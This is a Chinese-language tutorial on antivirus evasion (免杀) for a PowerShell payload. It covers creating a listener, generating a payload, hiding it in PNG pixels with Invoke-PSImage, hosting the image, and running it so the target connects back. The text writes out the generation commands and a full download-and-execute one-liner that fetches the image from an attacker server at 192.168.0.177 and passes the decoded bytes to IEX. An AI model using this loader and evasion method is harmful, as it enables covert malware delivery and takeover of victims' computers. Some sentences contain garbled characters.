## powershell的payload免杀

###  ** **一、首先创建一个监听器****

![1616331452_605742bce1122c7bc3bbe.png!small?1616331451159](https://image.3001.net/images/20210321/1616331452_605742bce1122c7bc3bbe.png!small?1616331451159)

###  ** **二、生成一个ps的payload****

![1616331461_605742c522648038c04cf.png!small?1616331459321](https://image.3001.net/images/20210321/1616331461_605742c522648038c04cf.png!small?1616331459321)

![1616331465_605742c95ba3f027208ce.png!small?1616331463558](https://image.3001.net/images/20210321/1616331465_605742c95ba3f027208ce.png!small?1616331463558)

![1616331469_605742cd885fb164fe09a.png!small?1616331467674](https://image.3001.net/images/20210321/1616331469_605742cd885fb164fe09a.png!small?1616331467674)

![1616331473_605742d1e42230c85820b.png!small?1616331472119](https://image.3001.net/images/20210321/1616331473_605742d1e42230c85820b.png!small?1616331472119)

 ** **查看一下生成的****

![1616331482_605742da8bbd8ad4c983e.png!small?1616331482304](https://image.3001.net/images/20210321/1616331482_605742da8bbd8ad4c983e.png!small?1616331482304)

###  ** **三、Ps的payload嵌入图片并且生成一段执行免杀代码****

 ** **1.介绍****

 ** **将生成的ps代码集成到一个图片中，图片尽量像素大一点，我们需要用到invoke-psimage脚本，原理是将脚本中的字节数据存储到图片中，而图片的每一个像素都会存一个字节，所以图片像素尽量大一点。****

 ** **Invoker-psimage****

 **
**Invokerpsimage会将一个powershell脚本以字节方式嵌入到png图片的像素中，并生成一行执行命令来帮助我们从文件或web执行它们。它会利用图片中每个像素点最后4位有效位的2个颜色值来存储****

 **
**payload数据，图片质量会稍微有些影响，但基本着不出来什么区别。图片需要为png格式，因为payload数据存储在颜色值中，所以这种格式尚政进行尤损压缩直不会影响payload执行。它可以接受大多数图片类型作为输入，但输出必须为png格式，因为输出图像数据需要是无损的。****

[ _https://github.com/peewpw/Invoke-PSImage_](https://github.com/peewpw/Invoke-PSImage)  

 ** ******

 ** **注意：图片大小一定是：1920x1111（我这个只是参考，大于这个更好）****

 ** **建议用ps软件去改大小，wps需要开会员，这就qt的吧****

![1616331498_605742ea5999a94cf7b70.png!small?1616331496993](https://image.3001.net/images/20210321/1616331498_605742ea5999a94cf7b70.png!small?1616331496993)

 ** **需要用github上的脚本进行生成****

 ** **-script：指定刚才下载的脚本****

 ** **-image: 指定图片****

 ** **-out：输出的位置****

 ** **-web：需要执行的命令****

 ** **2.将payload嵌入图片****

 ** **首先在当前目录下打开cmd绕过策略：****

![1616331507_605742f3a6b2f94f77a0d.png!small?1616331505940](https://image.3001.net/images/20210321/1616331507_605742f3a6b2f94f77a0d.png!small?1616331505940)

 ** **进行嵌入****

 ** **A、首先导入脚本****

 ** **Import-Module .\Invoke-PSImage.ps1****

 ** **B、其次在进行生成命令****

 ** **Invoke-PSImage -Script .\payload.ps1 -Image .\chaosec.jpg -Out test2.png
-Web****

 ** **C、生成的命令：（不过这里需要修改url的地址）****

 ** **sal a New-Object;Add-Type -A System.Drawing;$g=a
System.Drawing.Bitmap((a Net.WebClient).OpenRead("****[
_http://192.168.0.177:80/chaosec/test2.png_](http://192.168.0.177/chaosec/test2.png)
** **"));$o=a Byte[] 3992;(0..7)|%{foreach($x
in(0..498)){$p=$g.GetPixel($x,$_);$o[$_*499+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G
-band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3554]))****

![1616331517_605742fde9578779cb64f.png!small?1616331516388](https://image.3001.net/images/20210321/1616331517_605742fde9578779cb64f.png!small?1616331516388)

 ** **红框中的url需要修改****

 ** **查看生成的图片****

![1616331527_605743072f278e835b814.png!small?1616331525454](https://image.3001.net/images/20210321/1616331527_605743072f278e835b814.png!small?1616331525454)

###  ** **四、通过host file进行上传到服务器端****

![1616331538_6057431235eb97adb0f46.png!small?1616331536549](https://image.3001.net/images/20210321/1616331538_6057431235eb97adb0f46.png!small?1616331536549)

 ** **文件选择刚才生成的test2.png文件****

![1616331547_6057431b0093512d8dbf7.png!small?1616331545214](https://image.3001.net/images/20210321/1616331547_6057431b0093512d8dbf7.png!small?1616331545214)

 ** **文件选择刚才生成的test2.png文件****

![1616331559_60574327aef332129e512.png!small?1616331557941](https://image.3001.net/images/20210321/1616331559_60574327aef332129e512.png!small?1616331557941)

 ** **将这个生成的链接放到刚才生成需要修改的url中****

![1616331567_6057432f823c334051416.png!small?1616331565737](https://image.3001.net/images/20210321/1616331567_6057432f823c334051416.png!small?1616331565737)

 ** **在服务器端查看上传的文件****

 ** **发现上传成功****

![1616331578_6057433a63321f753fe40.png!small?1616331576579](https://image.3001.net/images/20210321/1616331578_6057433a63321f753fe40.png!small?1616331576579)

###  ** **五、执行命令使其上线****

![1616331588_605743441ce6c8cda83cf.png!small?1616331587433](https://image.3001.net/images/20210321/1616331588_605743441ce6c8cda83cf.png!small?1616331587433)

